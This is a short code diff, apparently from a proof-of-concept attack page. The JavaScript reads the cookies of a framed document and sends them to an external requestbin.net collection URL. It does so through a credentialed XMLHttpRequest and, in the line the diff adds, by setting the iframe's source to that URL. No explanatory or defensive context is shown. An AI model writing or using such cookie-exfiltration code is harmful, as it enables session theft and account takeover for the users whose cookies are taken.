@@ -20,6 +20,7 @@
         $('#frame1').load(function() { 
         var url='http://requestbin.net/r/1iksjrn1?c=' + document.getElementById("frame1").contentDocument.cookie;
         console.log("payload = " + url);
+        document.getElementById("frame1").src = url;
         var xhr = new XMLHttpRequest()
                 xhr.open('GET', url, true)
                 xhr.withCredentials = true
